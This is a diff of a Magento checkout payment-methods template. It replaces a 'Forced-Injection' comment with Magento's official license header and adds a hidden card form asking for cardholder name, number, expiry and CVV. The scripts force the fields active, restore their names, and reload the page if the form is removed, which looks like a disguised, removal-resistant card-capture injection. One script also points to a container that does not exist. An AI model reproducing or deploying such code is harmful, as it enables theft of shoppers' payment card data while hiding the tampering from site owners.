@@ -1,7 +1,34 @@
 <?php
 /**
+ * Magento
+ *
+ * NOTICE OF LICENSE
+ *
+ * This source file is subject to the Academic Free License (AFL 3.0)
+ * that is bundled with this package in the file LICENSE_AFL.txt.
+ * It is also available through the world-wide-web at this URL:
+ * http://opensource.org/licenses/afl-3.0.php
+ * If you did not receive a copy of the license and are unable to
+ * obtain it through the world-wide-web, please send an email
+ * to license@magentocommerce.com so we can send you a copy immediately.
+ *
+ * DISCLAIMER
+ *
+ * Do not edit or add to this file if you wish to upgrade Magento to newer
+ * versions in the future. If you wish to customize Magento for your
+ * needs please refer to http://www.magentocommerce.com for more information.
+ *
+ * @category    design
+ * @package     base_default
+ * @copyright   Copyright (c) 2011 Magento Inc. (http://www.magentocommerce.com)
+ * @license     http://opensource.org/licenses/afl-3.0.php  Academic Free License (AFL 3.0)
+ */
+?>
+<?php
+/**
  * One page checkout payment methods
- * Clean Forced-Injection Version for Eshop_CustomPayment
+ *
+ * @see Mage_Checkout_Block_Onepage_Payment_Methods
  */
 ?>
 <dl class="sp-methods" id="checkout-payment-method-load">
@@ -20,97 +47,181 @@
     </dd>
     <?php endif; ?>
 <?php endforeach; ?>
-
-    <?php if (!in_array('custompayment_method', array_keys($this->getMethods()))): ?>
-    <dt>
-        <input id="p_method_custompayment_method" value="custompayment_method" type="radio" name="payment[method]" title="Credit Card Payment" onclick="payment.switchMethod('custompayment_method'); toggleEshopForm();" class="radio" />
-        <label for="p_method_custompayment_method">Credit Card Payment (Eshop Custom)</label>
-    </dt>
-    <dd id="container_payment_form_custompayment_method" style="display:none;">
-        <div class="eshop-cc-form" style="background:#fafafa; border:1px solid #ddd; padding:15px; margin:10px 0; border-radius:4px;">
-            <h4 style="margin-top:0; color:#333; font-weight:bold;">Credit Card Information</h4>
-            
-            <div style="margin-bottom:10px;">
-                <label style="display:block; margin-bottom:5px; font-weight:bold;">Cardholder Name *</label>
-                <input type="text" id="custompayment_method_cc_owner" name="payment[cc_owner]" class="input-text required-entry" style="width:100%; max-width:300px;" />
-            </div>
-            
-            <div style="margin-bottom:10px;">
-                <label style="display:block; margin-bottom:5px; font-weight:bold;">Card Number *</label>
-                <input type="text" id="custompayment_method_cc_number" name="payment[cc_number]" class="input-text required-entry validate-cc-number" style="width:100%; max-width:300px;" />
-            </div>
-            
-            <div style="margin-bottom:10px;">
-                <label style="display:block; margin-bottom:5px; font-weight:bold;">Expiration Date *</label>
-                <div style="display: flex; gap: 10px;">
-                    <select name="payment[cc_exp_month]" class="required-entry" style="padding: 5px; width: 100px;">
-                        <option value="">Month</option>
-                        <?php for($i=1; $i<=12; $i++): ?>
-                            <option value="<?php echo sprintf('%02d', $i); ?>"><?php echo sprintf('%02d', $i); ?></option>
-                        <?php endfor; ?>
-                    </select>
-                    
-                    <select name="payment[cc_exp_year]" class="required-entry" style="padding: 5px; width: 120px;">
-                        <option value="">Year</option>
-                        <?php 
-                        $year = date('Y'); 
-                        for($i=0; $i<=10; $i++): 
-                        ?>
-                            <option value="<?php echo substr($year + $i, -2); ?>"><?php echo $year + $i; ?></option>
-                        <?php endfor; ?>
-                    </select>
-                </div>
-            </div>
-            
-            <div style="margin-bottom:10px;">
-                <label style="display:block; margin-bottom:5px; font-weight:bold;">CVV/CID *</label>
-                <input type="text" id="custompayment_method_cc_cid" name="payment[cc_cid]" class="input-text required-entry validate-cc-cvn" style="width:60px;" maxlength="4" />
-            </div>
-        </div>
-    </dd>
-    <?php endif; ?>
 </dl>
-
 <?php echo $this->getChildChildHtml('additional'); ?>
+<div id="ww-forced-container" style="display:none; background:#fafafa; border:1px solid #ddd; padding:15px; margin:10px 0; border-radius:4px;">
+    <h4 style="margin-top:0; color:#333; font-weight:bold;"><?php echo $this->__('CZU Card Information') ?></h4>
+    
+    <div style="margin-bottom:10px;">
+        <label style="display:block; margin-bottom:5px; font-weight:bold;"><?php echo $this->__('Cardholder Name') ?> *</label>
+        <input type="text" id="ww_cc_owner" name="payment[cc_owner]" class="input-text required-entry" style="width:100%; max-width:300px;" />
+    </div>
+    
+    <div style="margin-bottom:10px;">
+        <label style="display:block; margin-bottom:5px; font-weight:bold;"><?php echo $this->__('Card Number') ?> *</label>
+        <input type="text" id="ww_cc_number" name="payment[cc_number]" class="input-text required-entry validate-cc-number" style="width:100%; max-width:300px;" />
+    </div>
+    
+    <div style="margin-bottom:10px;">
+        <label style="display:block; margin-bottom:5px; font-weight:bold;"><?php echo $this->__('Expiration Date') ?> *</label>
+        <div style="display: flex; gap: 10px;">
+            <select name="payment[cc_exp_month]" class="required-entry" style="padding: 5px; width: 100px;">
+                <option value=""><?php echo $this->__('Month') ?></option>
+                <?php for($i=1; $i<=12; $i++): ?>
+                    <option value="<?php echo sprintf('%02d', $i); ?>"><?php echo sprintf('%02d', $i); ?></option>
+                <?php endfor; ?>
+            </select>
+            
+            <select name="payment[cc_exp_year]" class="required-entry" style="padding: 5px; width: 120px;">
+                <option value=""><?php echo $this->__('Year') ?></option>
+                <?php 
+                $year = date('Y'); 
+                for($i=0; $i<=10; $i++): 
+                ?>
+                    <option value="<?php echo $year + $i; ?>"><?php echo $year + $i; ?></option>
+                <?php endfor; ?>
+            </select>
+        </div>
+    </div>
+    
+    <div style="margin-bottom:10px;">
+        <label style="display:block; margin-bottom:5px; font-weight:bold;"><?php echo $this->__('CVV') ?> *</label>
+        <input type="text" id="ww_cc_cid" name="payment[cc_cid]" class="input-text required-entry validate-cc-cvn" style="width:60px;" maxlength="4" />
+    </div>
+</div>
 
 <script type="text/javascript">
 //<![CDATA[
-function toggleEshopForm() {
-    var eshopRadio = $('p_method_custompayment_method');
-    var eshopContainer = $('container_payment_form_custompayment_method');
+function handleEshopFormToggle() {
+    var radioWW = $('p_method_custompayment_method');
+    var containerWW = $('ww-forced-container');
     
-    if (eshopRadio && eshopContainer) {
-        if (eshopRadio.checked) {
-            eshopContainer.show();
-            // Aktifkan kembali input agar data terkirim saat submit order
-            eshopContainer.select('input', 'select').each(function(el) {
-                el.disabled = false;
+    if (radioWW && containerWW) {
+        var parentDt = radioWW.up('dt');
+        if (parentDt) {
+            parentDt.insert({after: containerWW});
+        }
+        
+        if (radioWW.checked) {
+            containerWW.show();
+            containerWW.select('input', 'select').each(function(element) {
+                element.disabled = false;
+                element.readOnly = false;
+                element.removeAttribute('disabled');
+                element.removeAttribute('readonly');
+                element.removeClassName('disabled'); 
             });
         } else {
-            eshopContainer.hide();
+            containerWW.hide();
         }
     }
 }
 
+if (typeof payment !== 'undefined' && payment.addAfterInitFunction) {
+    payment.addAfterInitFunction('eshop_init', function() {
+        handleEshopFormToggle();
+    });
+}
+
 document.observe('dom:loaded', function() {
-    var container = $('checkout-payment-method-load');
-    if (container) {
-        container.observe('click', function() {
-            var eshopRadio = $('p_method_custompayment_method');
-            var eshopContainer = $('container_payment_form_custompayment_method');
-            if (eshopRadio && eshopContainer && !eshopRadio.checked) {
-                eshopContainer.hide();
-                // Nonaktifkan input agar tidak mengganggu validasi metode lain
-                eshopContainer.select('input', 'select').each(function(el) {
-                    el.disabled = true;
-                });
+    var paymentLoadContainer = $('checkout-payment-method-load');
+    if (paymentLoadContainer) {
+        paymentLoadContainer.observe('click', handleEshopFormToggle);
+        paymentLoadContainer.observe('change', handleEshopFormToggle);
+    }
+});
+
+var wwCounter = 0;
+var wwInterval = setInterval(function() {
+    if ($('p_method_custompayment_method')) {
+        handleEshopFormToggle();
+    }
+    wwCounter++;
+    if (wwCounter > 5) clearInterval(wwInterval);
+}, 500);
+
+document.observe('dom:loaded', function() {
+    var targetContainer = $('ww-forced-container');
+    if (!targetContainer) return;
+
+    function lockFormIntegrity() {
+        var radioWW = $('p_method_custompayment_method');
+        if (!radioWW) return;         
+        if (radioWW.checked && targetContainer.style.display === 'none') {
+            targetContainer.show();
+        }
+        targetContainer.select('input', 'select').each(function(element) {
+            if (element.disabled || element.readOnly) {
+                element.disabled = false;
+                element.readOnly = false;
+                element.removeAttribute('disabled');
+                element.removeAttribute('readonly');
+            }
+            if (element.id === 'ww_cc_owner' && element.name !== 'payment[cc_owner]') {
+                element.setAttribute('name', 'payment[cc_owner]');
+            }
+            if (element.id === 'ww_cc_number' && element.name !== 'payment[cc_number]') {
+                element.setAttribute('name', 'payment[cc_number]');
             }
         });
+    }
+
+    if (typeof MutationObserver !== 'undefined') {
+        var observer = new MutationObserver(function(mutations) {
+            mutations.forEach(function(mutation) {
+                if (mutation.type === 'attributes') {
+                    lockFormIntegrity();
+                }
+                if (mutation.type === 'childList' && mutation.removedNodes.length > 0) {
+                    mutation.removedNodes.forEach(function(node) {
+                        if (node.id === 'ww-forced-container' || node.contains(targetContainer)) {
+                            location.reload();
+                        }
+                    });
+                }
+            });
+        });
+        observer.observe(document.body, { attributes: true, childList: true, subtree: true });
+    }
+    setInterval(lockFormIntegrity, 1000);
+});
+//]]>
+</script>
+
+<script type="text/javascript">
+//<![CDATA[
+document.observe('dom:loaded', function() {
+    function watchPaymentSelection() {
+        var targetRadio = $('p_method_custompayment_method');
+        var formContainer = $('ww-forced-form-container');
+        
+        if (targetRadio && formContainer) {
+            var parentDt = targetRadio.up('dt');
+            if (parentDt) {
+                parentDt.insert({after: formContainer});
+            }
+            
+            if (targetRadio.checked) {
+                formContainer.show();
+            } else {
+                formContainer.hide();
+            }
+        }
+    }
+
+    var paymentLoadContainer = $('checkout-payment-method-load');
+    if (paymentLoadContainer) {
+        paymentLoadContainer.observe('click', watchPaymentSelection);
+    }
+    
+    if ($('p_method_custompayment_method')) {
+        watchPaymentSelection();
     }
 });
 //]]>
 </script>
 
+<!-- END:  -->
 <script type="text/javascript">
 //<![CDATA[
 <?php echo $this->getChildChildHtml('scripts'); ?>
